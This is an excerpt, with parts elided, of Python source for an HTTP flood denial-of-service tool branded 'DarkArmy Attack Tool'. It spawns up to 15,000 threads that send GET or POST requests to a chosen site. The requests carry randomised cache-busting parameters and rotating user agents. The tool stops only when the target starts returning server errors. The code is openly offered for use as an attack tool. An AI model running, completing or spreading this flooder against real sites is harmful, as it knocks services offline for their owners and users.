...
def http_call(url, host, data, headers):
    global current
    ...
    try:
        ...
        if data:
            ...
            full_url = f"{url}{param_joiner}{build_block(random.randint(3, 10))}={build_block(random.randint(3, 10))}"
        ...
        if safe and response.status_code >= 500:
            print("Target complete, stopping attack.")
            sys.exit(0)
...
def main():
    ...
    parser = argparse.ArgumentParser(description="DarkArmy Attack Tool")
    parser.add_argument("-version", action="store_true", help="print version and exit")
    parser.add_argument("-safe", action="store_true", help="Autoshut after DOS")
    parser.add_argument("-site", default="http://localhost", help="Destination site")
    parser.add_argument("-agents", help="Get the list of user-agent lines from a file")
    parser.add_argument("-data", help="Data to POST, if present POST requests are used instead of GET")
    parser.add_argument("-header", action="append", help="Add headers to the request")
    args = parser.parse_args()

    if args.version:
        print(f"Cypher {__version__}")
        sys.exit(0)
    ...
    if args.agents:
        try:
            ...
            print(f"Could not load User-Agent list from {args.agents}")
            sys.exit(1)
	...
	╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝                  
            DEVELOPED BY NEBULA                                                                    
 -- DarkArmy Attack Started --\n           Go!\n\n""")

    signal.signal(signal.SIGINT, signal_handler)

    while True:
        if threading.active_count() < 15000:
            threading.Thread(target=http_call, args=(site, host, data, headers)).start()
